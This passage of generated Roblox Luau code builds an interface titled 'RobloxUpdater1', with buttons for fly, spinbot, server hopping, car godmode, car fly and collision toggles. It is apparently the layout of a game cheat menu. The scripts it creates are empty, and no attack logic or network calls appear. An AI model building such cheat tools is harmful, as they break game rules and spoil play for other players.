-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.UICorner \\ --
UI["107"] = Instance.new("UICorner", UI["104"])
UI["107"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.UIGradient \\ --
UI["108"] = Instance.new("UIGradient", UI["104"])
UI["108"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.animation \\ --
UI["109"] = Instance.new("LocalScript", UI["104"])
UI["109"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.Click Sound \\ --
UI["10a"] = Instance.new("LocalScript", UI["104"])
UI["10a"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.LocalScript \\ --
UI["10b"] = Instance.new("LocalScript", UI["104"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob \\ --
UI["10c"] = Instance.new("TextButton", UI["103"])
UI["10c"]["BorderSizePixel"] = 0
UI["10c"]["TextSize"] = 37
UI["10c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["10c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["10c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["10c"]["Size"] = UDim2.new(0, 187, 0, 55)
UI["10c"]["BackgroundTransparency"] = 0.85
UI["10c"]["Name"] = [[ServerHob]]
UI["10c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["10c"]["Text"] = [[Serverhob]]
UI["10c"]["Position"] = UDim2.new(0.04765, 0, 0.04646, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.TextLabel 1 \\ --
UI["10d"] = Instance.new("TextLabel", UI["10c"])
UI["10d"]["TextWrapped"] = true
UI["10d"]["BorderSizePixel"] = 0
UI["10d"]["TextTransparency"] = 0.32
UI["10d"]["TextScaled"] = true
UI["10d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["10d"]["TextSize"] = 74
UI["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["10d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["10d"]["BackgroundTransparency"] = 1
UI["10d"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["10d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["10d"]["Text"] = [[join a new server]]
UI["10d"]["Name"] = [[TextLabel 1]]
UI["10d"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.UIStroke \\ --
UI["10e"] = Instance.new("UIStroke", UI["10c"])
UI["10e"]["Transparency"] = 0.63
UI["10e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["10e"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.UICorner \\ --
UI["10f"] = Instance.new("UICorner", UI["10c"])
UI["10f"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.UIGradient \\ --
UI["110"] = Instance.new("UIGradient", UI["10c"])
UI["110"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.animation \\ --
UI["111"] = Instance.new("LocalScript", UI["10c"])
UI["111"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.Click Sound \\ --
UI["112"] = Instance.new("LocalScript", UI["10c"])
UI["112"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.LocalScript \\ --
UI["113"] = Instance.new("LocalScript", UI["10c"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot \\ --
UI["114"] = Instance.new("TextButton", UI["103"])
UI["114"]["BorderSizePixel"] = 0
UI["114"]["TextSize"] = 37
UI["114"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["114"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["114"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["114"]["Size"] = UDim2.new(0, 187, 0, 56)
UI["114"]["BackgroundTransparency"] = 0.85
UI["114"]["Name"] = [[Spinbot]]
UI["114"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["114"]["Text"] = [[Spinbot: OFF]]
UI["114"]["Position"] = UDim2.new(0.04358, 0, 1.01642, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.TextLabel 1 \\ --
UI["115"] = Instance.new("TextLabel", UI["114"])
UI["115"]["TextWrapped"] = true
UI["115"]["BorderSizePixel"] = 0
UI["115"]["TextTransparency"] = 0.32
UI["115"]["TextScaled"] = true
UI["115"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["115"]["TextSize"] = 74
UI["115"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["115"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["115"]["BackgroundTransparency"] = 1
UI["115"]["Size"] = UDim2.new(0, 189, 0, 17)
UI["115"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["115"]["Text"] = [[IDK spin bot or so]]
UI["115"]["Name"] = [[TextLabel 1]]
UI["115"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.UIStroke \\ --
UI["116"] = Instance.new("UIStroke", UI["114"])
UI["116"]["Transparency"] = 0.63
UI["116"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["116"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.UICorner \\ --
UI["117"] = Instance.new("UICorner", UI["114"])
UI["117"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.UIGradient \\ --
UI["118"] = Instance.new("UIGradient", UI["114"])
UI["118"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.animation \\ --
UI["119"] = Instance.new("LocalScript", UI["114"])
UI["119"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.Click Sound \\ --
UI["11a"] = Instance.new("LocalScript", UI["114"])
UI["11a"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.LocalScript \\ --
UI["11b"] = Instance.new("LocalScript", UI["114"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.UIListLayout \\ --
UI["11c"] = Instance.new("UIListLayout", UI["103"])
UI["11c"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["11c"]["Padding"] = UDim.new(0, 40)
UI["11c"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.UIPadding \\ --
UI["11d"] = Instance.new("UIPadding", UI["103"])
UI["11d"]["PaddingTop"] = UDim.new(0, 7)
UI["11d"]["PaddingBottom"] = UDim.new(0, 20)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle \\ --
UI["11e"] = Instance.new("Frame", UI["e"])
UI["11e"]["Visible"] = false
UI["11e"]["BorderSizePixel"] = 0
UI["11e"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["11e"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["11e"]["Position"] = UDim2.new(0.2262, 0, 0.15519, 0)
UI["11e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["11e"]["Name"] = [[Vehicle]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.UICorner \\ --
UI["11f"] = Instance.new("UICorner", UI["11e"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Underline \\ --
UI["120"] = Instance.new("Frame", UI["11e"])
UI["120"]["BorderSizePixel"] = 0
UI["120"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["120"]["Size"] = UDim2.new(0, 3, 0, -193)
UI["120"]["Position"] = UDim2.new(0.47297, 0, 0.94113, 0)
UI["120"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["120"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.TEXT \\ --
UI["121"] = Instance.new("TextLabel", UI["11e"])
UI["121"]["BorderSizePixel"] = 0
UI["121"]["TextTransparency"] = 0.44
UI["121"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["121"]["TextSize"] = 28
UI["121"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["121"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["121"]["BackgroundTransparency"] = 1
UI["121"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["121"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["121"]["Text"] = [[Vehicle Tab]]
UI["121"]["Name"] = [[TEXT]]
UI["121"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.TEXT.UICorner \\ --
UI["122"] = Instance.new("UICorner", UI["121"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.TEXT.Underline \\ --
UI["123"] = Instance.new("Frame", UI["121"])
UI["123"]["BorderSizePixel"] = 0
UI["123"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["123"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["123"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["123"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["123"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.UIGradient \\ --
UI["124"] = Instance.new("UIGradient", UI["11e"])
UI["124"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode \\ --
UI["125"] = Instance.new("TextButton", UI["11e"])
UI["125"]["BorderSizePixel"] = 0
UI["125"]["TextSize"] = 36
UI["125"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["125"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["125"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["125"]["Size"] = UDim2.new(0, 193, 0, 46)
UI["125"]["BackgroundTransparency"] = 0.85
UI["125"]["Name"] = [[Car Godmode]]
UI["125"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["125"]["Text"] = [[Car Godmode]]
UI["125"]["Position"] = UDim2.new(0.01921, 0, 0.26153, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.UICorner \\ --
UI["126"] = Instance.new("UICorner", UI["125"])
UI["126"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.UIStroke \\ --
UI["127"] = Instance.new("UIStroke", UI["125"])
UI["127"]["Transparency"] = 0.63
UI["127"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["127"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.click to tp \\ --
UI["128"] = Instance.new("TextLabel", UI["125"])
UI["128"]["TextWrapped"] = true
UI["128"]["BorderSizePixel"] = 0
UI["128"]["TextTransparency"] = 0.32
UI["128"]["TextScaled"] = true
UI["128"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["128"]["TextSize"] = 74
UI["128"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["128"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["128"]["BackgroundTransparency"] = 1
UI["128"]["Size"] = UDim2.new(0, 199, 0, 17)
UI["128"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["128"]["Text"] = [[no Damage - âˆž fuel]]
UI["128"]["Name"] = [[click to tp]]
UI["128"]["Position"] = UDim2.new(0, 0, 1.07749, 6)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.UIGradient \\ --
UI["129"] = Instance.new("UIGradient", UI["125"])
UI["129"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.LocalScript \\ --
UI["12a"] = Instance.new("LocalScript", UI["125"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.animation \\ --
UI["12b"] = Instance.new("LocalScript", UI["125"])
UI["12b"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly \\ --
UI["12c"] = Instance.new("TextButton", UI["11e"])
UI["12c"]["BorderSizePixel"] = 0
UI["12c"]["TextSize"] = 36
UI["12c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["12c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["12c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["12c"]["Size"] = UDim2.new(0, 193, 0, 46)
UI["12c"]["BackgroundTransparency"] = 0.85
UI["12c"]["Name"] = [[Carfly]]
UI["12c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["12c"]["Text"] = [[Car Fly: OFF]]
UI["12c"]["Position"] = UDim2.new(0.02371, 0, 0.64321, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.UICorner \\ --
UI["12d"] = Instance.new("UICorner", UI["12c"])
UI["12d"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.UIStroke \\ --
UI["12e"] = Instance.new("UIStroke", UI["12c"])
UI["12e"]["Transparency"] = 0.63
UI["12e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["12e"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.click to tp \\ --
UI["12f"] = Instance.new("TextLabel", UI["12c"])
UI["12f"]["TextWrapped"] = true
UI["12f"]["BorderSizePixel"] = 0
UI["12f"]["TextTransparency"] = 0.32
UI["12f"]["TextScaled"] = true
UI["12f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["12f"]["TextSize"] = 74
UI["12f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["12f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["12f"]["BackgroundTransparency"] = 1
UI["12f"]["Size"] = UDim2.new(0, 199, 0, 17)
UI["12f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["12f"]["Text"] = [[toggle with X]]
UI["12f"]["Name"] = [[click to tp]]
UI["12f"]["Position"] = UDim2.new(0, 0, 1.07749, 6)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.UIGradient \\ --
UI["130"] = Instance.new("UIGradient", UI["12c"])
UI["130"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.LocalScript \\ --
UI["131"] = Instance.new("LocalScript", UI["12c"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.animation \\ --
UI["132"] = Instance.new("LocalScript", UI["12c"])
UI["132"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2 \\ --
UI["133"] = Instance.new("ScrollingFrame", UI["11e"])
UI["133"]["Active"] = true
UI["133"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["133"]["BorderSizePixel"] = 0
UI["133"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["133"]["AutoLocalize"] = false
UI["133"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["133"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["133"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["133"]["Name"] = [[ScrollingFrame2]]
UI["133"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["133"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["133"]["Size"] = UDim2.new(0, 215, 0, 193)
UI["133"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["133"]["Position"] = UDim2.new(0.50225, 0, 0.20449, 0)
UI["133"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["133"]["ScrollBarThickness"] = 5
UI["133"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar \\ --
UI["134"] = Instance.new("TextButton", UI["133"])
UI["134"]["BorderSizePixel"] = 0
UI["134"]["TextSize"] = 35
UI["134"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["134"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["134"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["134"]["Size"] = UDim2.new(0, 204, 0, 46)
UI["134"]["BackgroundTransparency"] = 0.85
UI["134"]["Name"] = [[BringCar]]
UI["134"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["134"]["Text"] = [[Bring Car]]
UI["134"]["Position"] = UDim2.new(0.00541, 0, 0.49182, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.UICorner \\ --
UI["135"] = Instance.new("UICorner", UI["134"])
UI["135"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.UIStroke \\ --
UI["136"] = Instance.new("UIStroke", UI["134"])
UI["136"]["Transparency"] = 0.63
UI["136"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["136"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.TextLabel 1 \\ --
UI["137"] = Instance.new("TextLabel", UI["134"])
UI["137"]["TextWrapped"] = true
UI["137"]["BorderSizePixel"] = 0
UI["137"]["TextTransparency"] = 0.32
UI["137"]["TextScaled"] = true
UI["137"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["137"]["TextSize"] = 74
UI["137"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["137"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["137"]["BackgroundTransparency"] = 1
UI["137"]["Size"] = UDim2.new(0, 193, 0, 16)
UI["137"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["137"]["Text"] = [[bring your car]]
UI["137"]["Name"] = [[TextLabel 1]]
UI["137"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.UIGradient \\ --
UI["138"] = Instance.new("UIGradient", UI["134"])
UI["138"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.LocalScript \\ --
UI["139"] = Instance.new("LocalScript", UI["134"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.animation \\ --
UI["13a"] = Instance.new("LocalScript", UI["134"])
UI["13a"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning \\ --
UI["13b"] = Instance.new("TextButton", UI["133"])
UI["13b"]["BorderSizePixel"] = 0
UI["13b"]["TextSize"] = 35
UI["13b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["13b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["13b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["13b"]["Size"] = UDim2.new(0, 204, 0, 46)
UI["13b"]["BackgroundTransparency"] = 0.85
UI["13b"]["Name"] = [[Tuning]]
UI["13b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["13b"]["Text"] = [[Tuning LvL: ]]
UI["13b"]["Position"] = UDim2.new(0.01006, 0, 0.07388, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning.UICorner \\ --
UI["13c"] = Instance.new("UICorner", UI["13b"])
UI["13c"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning.UIStroke \\ --
UI["13d"] = Instance.new("UIStroke", UI["13b"])
UI["13d"]["Transparency"] = 0.63
UI["13d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["13d"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning.TextLabel 1 \\ --
UI["13e"] = Instance.new("TextLabel", UI["13b"])
UI["13e"]["TextWrapped"] = true
UI["13e"]["BorderSizePixel"] = 0
UI["13e"]["TextTransparency"] = 0.32
UI["13e"]["TextScaled"] = true
UI["13e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["13e"]["TextSize"] = 74
UI["13e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["13e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["13e"]["BackgroundTransparency"] = 1
UI["13e"]["Size"] = UDim2.new(0, 193, 0, 16)
UI["13e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["13e"]["Text"] = [[set your tuning level]]
UI["13e"]["Name"] = [[TextLabel 1]]
UI["13e"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning.LocalScript \\ --
UI["13f"] = Instance.new("LocalScript", UI["13b"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning.animation \\ --
UI["140"] = Instance.new("LocalScript", UI["13b"])
UI["140"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.UIListLayout \\ --
UI["141"] = Instance.new("UIListLayout", UI["133"])
UI["141"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["141"]["Padding"] = UDim.new(0, 40)
UI["141"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.UIPadding \\ --
UI["142"] = Instance.new("UIPadding", UI["133"])
UI["142"]["PaddingTop"] = UDim.new(0, 7)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires \\ --
UI["143"] = Instance.new("TextButton", UI["133"])
UI["143"]["BorderSizePixel"] = 0
UI["143"]["TextSize"] = 35
UI["143"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["143"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["143"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["143"]["Size"] = UDim2.new(0, 204, 0, 46)
UI["143"]["BackgroundTransparency"] = 0.85
UI["143"]["Name"] = [[GodTires]]
UI["143"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["143"]["Text"] = [[Repair Tires]]
UI["143"]["Position"] = UDim2.new(0.007, 0, 0.91531, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.UICorner \\ --
UI["144"] = Instance.new("UICorner", UI["143"])
UI["144"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.UIStroke \\ --
UI["145"] = Instance.new("UIStroke", UI["143"])
UI["145"]["Transparency"] = 0.63
UI["145"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["145"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.TextLabel 1 \\ --
UI["146"] = Instance.new("TextLabel", UI["143"])
UI["146"]["TextWrapped"] = true
UI["146"]["BorderSizePixel"] = 0
UI["146"]["TextTransparency"] = 0.32
UI["146"]["TextScaled"] = true
UI["146"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["146"]["TextSize"] = 74
UI["146"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["146"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["146"]["BackgroundTransparency"] = 1
UI["146"]["Size"] = UDim2.new(0, 193, 0, 16)
UI["146"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["146"]["Text"] = [[Press to repair ur tires]]
UI["146"]["Name"] = [[TextLabel 1]]
UI["146"]["Position"] = UDim2.new(-0, 0, 1.20311, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.UIGradient \\ --
UI["147"] = Instance.new("UIGradient", UI["143"])
UI["147"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.LocalScript \\ --
UI["148"] = Instance.new("LocalScript", UI["143"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.animation \\ --
UI["149"] = Instance.new("LocalScript", UI["143"])
UI["149"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions \\ --
UI["14a"] = Instance.new("TextButton", UI["133"])
UI["14a"]["BorderSizePixel"] = 0
UI["14a"]["TextSize"] = 35
UI["14a"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["14a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["14a"]["Size"] = UDim2.new(0, 204, 0, 46)
UI["14a"]["BackgroundTransparency"] = 0.85
UI["14a"]["Name"] = [[Collisions]]
UI["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["14a"]["Text"] = [[Collisions: ON]]
UI["14a"]["Position"] = UDim2.new(0.01006, 0, 0.07388, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.UICorner \\ --
UI["14b"] = Instance.new("UICorner", UI["14a"])
UI["14b"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.UIStroke \\ --
UI["14c"] = Instance.new("UIStroke", UI["14a"])
UI["14c"]["Transparency"] = 0.63
UI["14c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["14c"]["Thickness"] = 1.7
